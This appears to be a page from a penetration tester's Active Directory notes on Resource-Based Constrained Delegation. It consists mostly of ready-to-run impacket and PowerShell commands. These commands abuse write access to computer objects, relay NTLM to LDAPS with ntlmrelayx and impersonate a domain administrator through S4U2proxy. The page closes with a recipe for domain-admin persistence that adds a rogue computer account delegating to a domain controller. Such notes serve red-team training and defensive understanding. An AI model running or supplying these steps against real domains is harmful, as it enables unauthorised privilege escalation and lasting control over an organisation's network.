---
title: RBCD
---

[[notes/ad/kerberos]] Resource-based Constrained Delegation requires a domain functional level of Windows Server 2012 or higher.
It is configured by writing the SID of the frontend service to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the backend service.
The frontend service must have a SPN.

This means if you have write access to a computer object and you have the credentials of another [[notes/ad/domain-computer|computer account]] you can use RBCD to become local admin on the computer.

[[notes/ad/dacl-abuse|Abuse]] `GenericWrite` on `srv01$` while controlling `hackerpc$` to setup RBCD.
Then impersonate a domain admin on `srv01$` trough [[notes/ad/kerberos-s4u2proxy]].

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-rbcd -action write -delegate-from 'hackerpc$' -delegate-to 'srv01$' -hashes :$nthash corp.local/jdoe
    impacket-getst -impersonate administrator -spn cifs/srv01.corp.local -hashes :$nthash 'corp.local/hackerpc$'
    export KRB5CCNAME="$PWD/administrator.ccache"
    ~~~

=== "[[notes/tools/powershell-rsat]]"
    ~~~ powershell
    Set-ADComputer 'srv01' -PrincipalsAllowedToDelegateToAccount (Get-ADComputer 'hackerpc' -Server dc01.corp.local) -Server dc01.corp.local
    ~~~

Reflective RBCD from computer to itself.
Then impersonate a domain admin on the computer trough [[notes/ad/kerberos-s4u2proxy]].

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-rbcd -action write -delegate-from 'srv01$' -delegate-to 'srv01$' -hashes :$nthash 'corp.local/srv01$'
    impacket-getst -impersonate administrator -spn cifs/srv01.corp.local -hashes :$nthash 'corp.local/srv01$'
    export KRB5CCNAME="$PWD/administrator.ccache"
    ~~~

Clean up.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-rbcd -action flush -delegate-from 'hackerpc$' -delegate-to 'srv01$' -hashes :$nthash corp.local/jdoe
    ~~~

=== "[[notes/tools/powershell-rsat]]"
    ~~~ bash
    Set-ADComputer 'srv01'-clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Server dc01.corp.local
    ~~~

NTLM relay [[notes/ad/ntlm-relay-to-ldap|to LDAP]] and open an interactive LDAP shell.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --interactive --target ldaps://dc01.corp.local
    ~~~

    ~~~
    $ nc -v 127.0.0.1 11000
    # set_rbcd srv01$ hackerpc$
    # clear_rbcd srv01$
    # exit
    ~~~

NTLM relay [[notes/ad/ntlm-relay-to-ldap|to LDAP]].
If `--escalate-user` is not specified a new computer account will be created.
If this is not possible the attack fails.
Requires manual cleanup.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --delegate-access --escalate-user 'hackerpc$' --target ldaps://dc01.corp.local
    ~~~

[[notes/ad/persistence]] as domain admin by configuring RBCD from a computer you control to a DC.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-addcomputer -computer-name evilcomputer -k -no-pass corp.local/administrator
    impacket-rbcd -action write -delegate-from 'evilcomputer$' -delegate-to 'dc01$' -k -no-pass corp.local/administrator
    ~~~

References:

- [A Hitch-hacker's Guide to DACL-Based Detections (Part 1A)](http://web.archive.org/web/20231010183106/https://trustedsec.com/blog/a-hitchhackers-guide-to-dacl-based-detections-part-1-a)
- [You Do (Not) Understand Kerberos Delegation - RBCD](https://www.youtube.com/watch?v=vlKwCTvp5_w)
- [S4fuckMe2selfAndUAndU2proxy - A low dive into Kerberos delegations](http://web.archive.org/web/20221130170845/https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to attack Active Directory](http://web.archive.org/web/20221124041440/https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- iX Kompakt Sicheres Active Directory S. 60ff
- [thehacker.recipes/ad/movement/kerberos/delegations/rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [thehacker.recipes/ad/persistence/delegation-to-krbtgt](https://www.thehacker.recipes/ad/persistence/delegation-to-krbtgt)
